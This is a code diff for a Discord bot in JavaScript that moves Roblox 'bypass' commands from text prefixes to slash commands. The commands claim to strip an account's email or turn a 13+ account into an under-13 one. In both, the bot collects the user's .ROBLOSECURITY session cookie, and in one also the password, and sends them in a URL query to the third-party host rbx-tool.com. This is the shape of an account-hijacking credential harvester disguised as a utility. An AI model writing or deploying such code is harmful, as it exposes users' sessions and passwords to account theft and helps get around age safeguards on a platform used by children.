@@ -1,54 +1,70 @@
-const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
-const keepAlive = require('./keepalive.js');
+const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
+require('dotenv').config();
 const fetch = require('node-fetch');
 
-// Start keep-alive server
-keepAlive();
-
+// Initialize client
 const client = new Client({
-  intents: [
-    GatewayIntentBits.Guilds,
-    GatewayIntentBits.GuildMessages,
-    GatewayIntentBits.MessageContent
-  ]
+  intents: [GatewayIntentBits.Guilds]
 });
 
-client.on('ready', () => {
+client.once('ready', () => {
   console.log(`✅ Logged in as ${client.user.tag}`);
 });
 
-client.on('messageCreate', async (message) => {
-  if (message.author.bot) return;
+// Slash command registration
+client.on('ready', async () => {
+  const commands = [
+    new SlashCommandBuilder()
+      .setName('bypass2008')
+      .setDescription('Bypass email with 2008 birth year')
+      .addStringOption(option =>
+        option.setName('cookie')
+          .setDescription('.ROBLOSECURITY cookie')
+          .setRequired(true)
+      ),
+    new SlashCommandBuilder()
+      .setName('bypass13plus')
+      .setDescription('Bypass 13+ account to under 13')
+      .addStringOption(option =>
+        option.setName('cookie')
+          .setDescription('.ROBLOSECURITY cookie')
+          .setRequired(true)
+      )
+      .addStringOption(option =>
+        option.setName('password')
+          .setDescription('Your Roblox password')
+          .setRequired(true)
+      )
+  ].map(cmd => cmd.toJSON());
 
-  const args = message.content.trim().split(" ");
-  const command = args.shift().toLowerCase();
-
-  if (command === "!ping") {
-    message.reply("🏓 Pong!");
-    return;
+  const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
+  try {
+    await rest.put(
+      Routes.applicationCommands(client.user.id),
+      { body: commands }
+    );
+    console.log('✅ Slash commands registered');
+  } catch (err) {
+    console.error('❌ Error registering commands:', err);
   }
+});
 
-  // !bypass2008 <cookie>
-  if (command === "!bypass2008") {
-    if (!args[0]) return message.reply("❌ Provide your .ROBLOSECURITY cookie");
+// Slash command logic
+client.on('interactionCreate', async interaction => {
+  if (!interaction.isChatInputCommand()) return;
 
-    const cookie = args[0];
-    const url = `https://rbx-tool.com/apis/bypassAge?a=${encodeURIComponent(cookie)}`;
+  if (interaction.commandName === 'bypass2008') {
+    const cookie = interaction.options.getString('cookie');
+
+    await interaction.reply({ content: '⏳ Processing your request...', ephemeral: true });
 
     try {
-      await new Promise(r => setTimeout(r, 3000)); // 3s delay
-
-      const res = await fetch(url, {
+      const res = await fetch(`https://rbx-tool.com/apis/bypassAge?a=${encodeURIComponent(cookie)}`, {
         headers: {
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-          'Accept': 'application/json, text/plain, */*',
-          'Accept-Language': 'en-US,en;q=0.9',
-          'Referer': 'https://rbx-tool.com/',
-          'Origin': 'https://rbx-tool.com',
-          'Connection': 'keep-alive'
+          'User-Agent': 'Mozilla/5.0',
+          'Accept': 'application/json'
         }
       });
-
       const data = await res.json();
 
       const embed = new EmbedBuilder()
@@ -56,40 +72,29 @@ client.on('messageCreate', async (message) => {
         .setTitle(data.status === "success" ? "✅ Success" : "❌ Failed")
         .setDescription(data.message || (data.status === "success" ? "Success removing email!" : "Unknown error"));
 
-      await message.reply({ embeds: [embed] });
+      await interaction.followUp({ embeds: [embed] });
     } catch (err) {
       const embed = new EmbedBuilder()
         .setColor(0xfacc15)
         .setTitle("🚫 Request Failed")
         .setDescription("Request blocked or failed to fetch data.");
-      await message.reply({ embeds: [embed] });
+      await interaction.followUp({ embeds: [embed] });
     }
-
-    setTimeout(() => message.delete().catch(() => {}), 8000);
   }
 
-  // !bypass13plus <cookie> <password>
-  if (command === "!bypass13plus") {
-    if (!args[0] || !args[1]) return message.reply("❌ Usage: `!bypass13plus <cookie> <password>`");
+  if (interaction.commandName === 'bypass13plus') {
+    const cookie = interaction.options.getString('cookie');
+    const password = interaction.options.getString('password');
 
-    const cookie = args[0];
-    const password = args.slice(1).join(" ");
-    const url = `https://rbx-tool.com/apis/bypassAgeV2?a=${encodeURIComponent(cookie)}&b=${encodeURIComponent(password)}`;
+    await interaction.reply({ content: '⏳ Processing your request...', ephemeral: true });
 
     try {
-      await new Promise(r => setTimeout(r, 3000)); // 3s delay
-
-      const res = await fetch(url, {
+      const res = await fetch(`https://rbx-tool.com/apis/bypassAgeV2?a=${encodeURIComponent(cookie)}&b=${encodeURIComponent(password)}`, {
         headers: {
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-          'Accept': 'application/json, text/plain, */*',
-          'Accept-Language': 'en-US,en;q=0.9',
-          'Referer': 'https://rbx-tool.com/',
-          'Origin': 'https://rbx-tool.com',
-          'Connection': 'keep-alive'
+          'User-Agent': 'Mozilla/5.0',
+          'Accept': 'application/json'
         }
       });
-
       const data = await res.json();
 
       const embed = new EmbedBuilder()
@@ -97,26 +102,15 @@ client.on('messageCreate', async (message) => {
         .setTitle(data.status === "success" ? "✅ Success" : "❌ Failed")
         .setDescription(data.message || (data.status === "success" ? "Success converting 13+ to under 13!" : "Unknown error"));
 
-      await message.reply({ embeds: [embed] });
+      await interaction.followUp({ embeds: [embed] });
     } catch (err) {
       const embed = new EmbedBuilder()
         .setColor(0xfacc15)
         .setTitle("🚫 Request Failed")
         .setDescription("Request blocked or failed to fetch data.");
-      await message.reply({ embeds: [embed] });
+      await interaction.followUp({ embeds: [embed] });
     }
-
-    setTimeout(() => message.delete().catch(() => {}), 8000);
-  }
-
-  if (command === "!help") {
-    const embed = new EmbedBuilder()
-      .setColor(0x60a5fa)
-      .setTitle("📘 Help Menu")
-      .setDescription("• `!bypass2008 <cookie>` – Bypass with 2008 birth year\n• `!bypass13plus <cookie> <password>` – Bypass for 13+ accounts");
-    message.reply({ embeds: [embed] });
   }
 });
 
-// Login using Railway-provided secret
 client.login(process.env.BOT_TOKEN);
